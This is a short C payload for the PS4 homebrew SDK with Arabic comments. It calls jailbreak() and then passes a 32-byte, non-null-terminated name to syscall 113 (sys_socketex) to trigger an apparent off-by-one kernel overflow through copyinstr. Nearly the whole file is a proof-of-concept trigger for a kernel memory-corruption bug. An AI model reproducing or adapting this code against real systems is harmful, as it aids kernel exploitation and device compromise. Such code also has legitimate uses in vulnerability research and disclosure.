#include "ps4.h"


#define SYS_SOCKETEX  113  

int _main(struct thread *td) {
    UNUSED(td);

    initKernel();
    initLibc();
    initNetwork();
    jailbreak();
    initSysUtil();

    printf_debug("=== sys_socketex off-by-one  + overflow size ===\n");
    printf_debug("Bug: start \n\n");

    // name بطول 0x20 بدون null terminator
    // سيجبر copyinstr يكتب 0x21 bytes
    char name[0x20];
    memset(name, 0x41, 0x20);  // 'A' * 32 — بدون null!

    struct {
        void*    name_ptr;   // param_2[0] ← pointer للـ name
        int      domain;     // param_2[1] ← AF_INET = 2
        int      type;       // param_2[2] ← SOCK_STREAM = 1
        int      protocol;   // param_2[3] ← 0
    } args = {
        .name_ptr = name,
        .domain   = AF_INET,
        .type     = SOCK_STREAM,
        .protocol = 0,
    };

    printf_debug("name = 0x41 * 0x20 (no null terminator)\n");
    printf_debug("calling socketex...\n");

    int r = syscall(SYS_SOCKETEX, &args);
    printf_debug("socketex r=%d\n", r);

    
    return 0;
}